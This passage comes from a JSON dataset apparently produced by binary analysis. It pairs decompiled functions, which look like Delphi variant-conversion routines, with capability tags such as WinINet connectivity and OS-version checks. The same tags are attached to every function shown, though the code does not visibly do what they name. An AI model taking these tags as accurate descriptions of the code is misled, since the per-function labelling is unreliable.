4);\n    }\n    return uVar1;\n}\n",
        "token_count": 368
    },
    "00411bd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00411bd0(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar3 = CONCAT44(var_ch, var_10h);\n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x411fdc;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x411c03\n    switch(uVar1) {\n    case 0:\n        uVar3 = 0;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            puStack36 = &stack0xfffffffc;\n            fcn.0040fc88();\n        }\n        uVar3 = 0;\n        break;\n    case 2:\n        uVar3 = in_EAX[4];\n        break;\n    case 3:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        break;\n    case 5:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        break;\n    case 6:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        break;\n    case 7:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00402f64();\n        break;\n    case 8:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00411a18();\n        break;\n    case 9:\n    case 0xd:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.0041196c();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00411a18();\n        }\n        else if (uVar1 == 0x101) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00411b18();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack36 = &stack0xfffffffc;\n            cVar2 = fcn.00411b84();\n            if (cVar2 == '\\0') {\n                uVar3 = fcn.0041196c();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x411e27\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.0041196c();\n                break;\n            case 2:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 3:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                break;\n            case 5:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                break;\n            case 6:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                break;\n            case 7:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00402f64();\n                break;\n            case 8:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00411a18();\n                break;\n            case 0xb:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00411bd0();\n                break;\n            case 0x10:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                uVar3 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        uVar3 = in_EAX[4];\n        break;\n    case 0xc:\n        uVar3 = fcn.00411bd0();\n        break;\n    case 0x10:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar3 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        uVar3 = *(in_EAX + 4);\n    }\n    *in_FS_OFFSET = uStack44;\n    return uVar3;\n}\n",
        "token_count": 1256
    },
    "00412014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412014(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int16_t var_ah;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &var_1h + 1;\n    var_8h = 0;\n    uStack32 = 0x4120cb;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    fcn.0041418c();\n    uVar3 = var_8h;\n    iVar2 = (***0x484598)(var_8h, 0x400, 0, &var_ah);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.00404850();\n        cVar1 = fcn.00408ec4();\n        if (cVar1 == '\\0') {\n            fcn.0041011c();\n        }\n    }\n    else if (iVar2 == 0) {\n        var_1h._0_1_ = '\\x01' - (var_ah == 0);\n    }\n    else {\n        fcn.0041011c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004045c8(0x4120d2);\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 366
    },
    "004120dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004120dc(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x484728)(&puStack24);\n    fcn.0041011c();\n    return 1;\n}\n",
        "token_count": 75
    },
    "00412180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412180(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint uStack28;\n    \n    uVar1 = fcn.00417654();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(uStack28 + 0x1c))(0xb);\n        *param_2 = '\\x01' - (uStack28 == 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 138
    },
    "004121cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004121cc(uint32_t param_1)\n\n{\n    float fVar1;\n    double dVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint16_t *in_EAX;\n    int32_t *piVar6;\n    bool bVar7;\n    uint32_t uStack8;\n    \n    uVar3 = *in_EAX;\n    uVar4 = in_EAX & 0xffff0000;\n    uVar5 = uVar3;\n    piVar6 = uVar4 | uVar5;\n    // switch table (21 cases) at 0x4121e6\n    switch(uVar5) {\n    case 0:\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            piVar6 = fcn.0040fc88();\n        }\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 2:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 3:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 4:\n        uVar3 = *(in_EAX + 4) == *0x412510;\n        piVar6 = uVar4 | ((*(in_EAX + 4) < *0x412510) << 8 | uVar3 << 0xe);\n        uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n        break;\n    case 5:\n        uVar3 = *(in_EAX + 4) == *0x412510;\n        piVar6 = uVar4 | ((*(in_EAX + 4) < *0x412510) << 8 | uVar3 << 0xe);\n        uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n        break;\n    case 6:\n        uVar3 = *(in_EAX + 4) == *0x412510;\n        piVar6 = uVar4 | ((*(in_EAX + 4) < *0x412510) << 8 | uVar3 << 0xe);\n        uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n        break;\n    case 7:\n        uVar3 = *(in_EAX + 4) == *0x412510;\n        piVar6 = uVar4 | ((*(in_EAX + 4) < *0x412510) << 8 | uVar3 << 0xe);\n        uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n        break;\n    case 8:\n        piVar6 = fcn.00412014();\n        uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n        break;\n    case 9:\n    case 0xd:\n        piVar6 = fcn.004120dc();\n        uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n        break;\n    default:\n        if (uVar3 == 0x100) {\n            piVar6 = fcn.00412014();\n            uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n        }\n        else if (uVar3 == 0x101) {\n            piVar6 = fcn.0041211c();\n            uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n        }\n        else if ((uVar3 & 0x4000) == 0) {\n            piVar6 = fcn.00412180();\n            uStack8 = param_1;\n            if (piVar6 == '\\0') {\n                piVar6 = fcn.004120dc();\n                uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4123a8\n            switch(uVar5 & 0xbfff) {\n            default:\n                piVar6 = fcn.004120dc();\n                uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n                break;\n            case 2:\n                piVar6 = *(in_EAX + 4);\n                uStack8 = param_1 & 0xffffff00 | *piVar6 != 0;\n                break;\n            case 3:\n                piVar6 = *(in_EAX + 4);\n                uStack8 = param_1 & 0xffffff00 | *piVar6 != 0;\n                break;\n            case 4:\n                fVar1 = **(in_EAX + 4);\n                uVar3 = fVar1 == *0x412510;\n                piVar6 = *(in_EAX + 4) & 0xffff0000 | (fVar1 < *0x412510) << 8 | uVar3 << 0xe;\n                uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n                break;\n            case 5:\n                dVar2 = **(in_EAX + 4);\n                uVar3 = dVar2 == *0x412510;\n                piVar6 = *(in_EAX + 4) & 0xffff0000 | (dVar2 < *0x412510) << 8 | uVar3 << 0xe;\n                uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n                break;\n            case 6:\n                fVar1 = **(in_EAX + 4);\n                uVar3 = fVar1 == *0x412510;\n                piVar6 = *(in_EAX + 4) & 0xffff0000 | (fVar1 < *0x412510) << 8 | uVar3 << 0xe;\n                uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n                break;\n            case 7:\n                dVar2 = **(in_EAX + 4);\n                uVar3 = dVar2 == *0x412510;\n                piVar6 = *(in_EAX + 4) & 0xffff0000 | (dVar2 < *0x412510) << 8 | uVar3 << 0xe;\n                uStack8 = param_1 & 0xffffff00 | uVar3 == 0;\n                break;\n            case 8:\n                piVar6 = fcn.00412014();\n                uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n                break;\n            case 0xb:\n                piVar6 = NULL;\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0xc:\n                piVar6 = fcn.004121cc();\n                uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n                break;\n            case 0x10:\n                piVar6 = *(in_EAX + 4);\n                uStack8 = param_1 & 0xffffff00 | *piVar6 != '\\0';\n                break;\n            case 0x11:\n                piVar6 = *(in_EAX + 4);\n                uStack8 = param_1 & 0xffffff00 | *piVar6 != '\\0';\n                break;\n            case 0x12:\n                piVar6 = *(in_EAX + 4);\n                uStack8 = param_1 & 0xffffff00 | *piVar6 != 0;\n                break;\n            case 0x13:\n                piVar6 = *(in_EAX + 4);\n                uStack8 = param_1 & 0xffffff00 | *piVar6 != 0;\n                break;\n            case 0x14:\n                piVar6 = *(in_EAX + 4);\n                bVar7 = piVar6[1] == 0;\n                if (bVar7) {\n                    bVar7 = *piVar6 == 0;\n                }\n                piVar6 = piVar6 & 0xffffff00;\n                uStack8 = param_1 & 0xffffff00 | !bVar7;\n            }\n        }\n        break;\n    case 0xb:\n        piVar6 = NULL;\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 0xc:\n        piVar6 = fcn.004121cc();\n        uStack8 = param_1 & 0xffffff00 | piVar6 & 0xff;\n        break;\n    case 0x10:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x11:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x12:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 0x13:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 0x14:\n        bVar7 = *(in_EAX + 6) == 0;\n        if (bVar7) {\n            bVar7 = *(in_EAX + 4) == 0;\n        }\n        piVar6 = uVar4 | uVar5 & 0xffffff00;\n        uStack8 = param_1 & 0xffffff00 | !bVar7;\n    }\n    return CONCAT44(uStack8, piVar6 & 0xffffff00 | uStack8 & 0xff);\n}\n",
        "token_count": 2231
    },
    "004126e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004126e0(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    double dStack24;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4126fc\n    switch(uVar1) {\n    case 0:\n        dStack24 = 0.0;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            fcn.0040fc88();\n        }\n        dStack24 = 0.0;\n        break;\n    case 2:\n        dStack24 = in_EAX[4];\n        break;\n    case 3:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 4:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 5:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 6:\n        dStack24 = *(in_EAX + 4) / *0x412a58;\n        break;\n    case 7:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 8:\n        fVar3 = fcn.00412520();\n        dStack24 = fVar3;\n        break;\n    case 9:\n    case 0xd:\n        fVar3 = fcn.004125e4();\n        dStack24 = fVar3;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            fVar3 = fcn.00412520();\n            dStack24 = fVar3;\n        }\n        else if (uVar1 == 0x101) {\n            fVar3 = fcn.00412630();\n            dStack24 = fVar3;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar2 = fcn.00412694();\n            if (cVar2 == '\\0') {\n                fVar3 = fcn.004125e4();\n                dStack24 = fVar3;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4128d9\n            switch(uVar1 & 0xbfff) {\n            default:\n                fVar3 = fcn.004125e4();\n                dStack24 = fVar3;\n                break;\n            case 2:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 3:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 4:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 5:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 6:\n                dStack24 = **(in_EAX + 4) / *0x412a58;\n                break;\n            case 7:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 8:\n                fVar3 = fcn.00412520();\n                dStack24 = fVar3;\n                break;\n            case 0xb:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                fVar3 = fcn.004126e0();\n                dStack24 = fVar3;\n                break;\n            case 0x10:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                dStack24 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        dStack24 = in_EAX[4];\n        break;\n    case 0xc:\n        fVar3 = fcn.004126e0();\n        dStack24 = fVar3;\n        break;\n    case 0x10:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        dStack24 = in_EAX[4];\n        break;\n    case 0x13:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        dStack24 = *(in_EAX + 4);\n    }\n    return dStack24;\n}\n",
        "token_count": 1061
    },
    "00412a78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00412a78(void)\n\n{\n    ushort *in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    float var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    // switch table (21 cases) at 0x412a9a\n    switch(*in_EAX) {\n    case 0:\n        var_8h = 0.0;\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            puStack40 = 0x412b0e;\n            fcn.0040fc88();\n        }\n        var_8h = 0.0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        var_8h = *(in_EAX + 4);\n        break;\n    default:\n        uStack44 = 0x412bdd;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        fVar1 = fcn.004126e0();\n        var_8h = fVar1;\n        *in_FS_OFFSET = uStack48;\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 481
    },
    "00412e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00412e50(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    double in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = SUB84(in_stack_ffffffe0, 0);\n    // switch table (21 cases) at 0x412e6c\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x412ee4, uVar4);\n            fcn.0040fc88();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n    case 6:\n        in_stack_ffffffe0 = CONCAT44(0x412f11, uVar4);\n        fcn.00412d54();\n        break;\n    case 7:\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x412f33, uVar4);\n        fcn.00412c08();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x412fdd, uVar4);\n        fcn.00412d54();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x412ffd, uVar4);\n            fcn.00412c08();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x41300d, uVar4);\n            fcn.00412da0();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x413187, uVar4);\n            cVar2 = fcn.00412e04();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x413192, SUB84(in_stack_ffffffe0, 0));\n                fcn.00412d54();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413037\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x413178, uVar4);\n                fcn.00412d54();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n            case 6:\n                in_stack_ffffffe0 = CONCAT44(0x4130ae, uVar4);\n                fcn.00412d54();\n                break;\n            case 7:\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x4130d2, uVar4);\n                fcn.00412c08();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x41316b, uVar4);\n                fcn.00412e50();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00412cf4(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = fVar3;\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x412fcd, uVar4);\n        fcn.00412e50();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00412cf4(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = fVar3;\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1013
    },
    "004133b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004133b8(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    int64_t in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = in_stack_ffffffe0;\n    // switch table (21 cases) at 0x4133d4\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x48344c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x41344c, uVar4);\n            fcn.0040fc88();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n        in_stack_ffffffe0 = CONCAT44(0x413485, uVar4);\n        fcn.004132bc();\n        break;\n    case 6:\n        break;\n    case 7:\n        in_stack_ffffffe0 = CONCAT44(0x4134a7, uVar4);\n        fcn.004132bc();\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x4134b7, uVar4);\n        fcn.004131a0();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x41357f, uVar4);\n        fcn.004132bc();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x41359f, uVar4);\n            fcn.004131a0();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x4135af, uVar4);\n            fcn.00413308();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x413766, uVar4);\n            cVar2 = fcn.0041336c();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x413771, in_stack_ffffffe0);\n                fcn.004132bc();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4135d9\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x413757, uVar4);\n                fcn.004132bc();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n                in_stack_ffffffe0 = CONCAT44(0x41365c, uVar4);\n                fcn.004132bc();\n                break;\n            case 6:\n                break;\n            case 7:\n                in_stack_ffffffe0 = CONCAT44(0x413680, uVar4);\n                fcn.004132bc();\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x413690, uVar4);\n                fcn.004131a0();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x41374a, uVar4);\n                fcn.004133b8();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.0041325c(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = ROUND(fVar3);\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x41356f, uVar4);\n        fcn.004133b8();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.0041325c(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = ROUND(fVar3);\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1066
    },
    "004139e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004139e8(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x413a0a;\n    var_4h = param_2;\n    uVar1 = fcn.00417654();\n    var_5h = uVar1;\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.004139e8::pvarg;\n        puStack44 = 0x413a1c;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x413a5d;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.0040461c();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x413a64;\n        uStack52 = 0x413a5c;\n        uVar1 = fcn.004104c0();\n        return uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 348
    },
    "00413a6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00413a6c(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x413f99;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00413a6c::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x413aa6\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.004045c8();\n        break;\n    case 1:\n        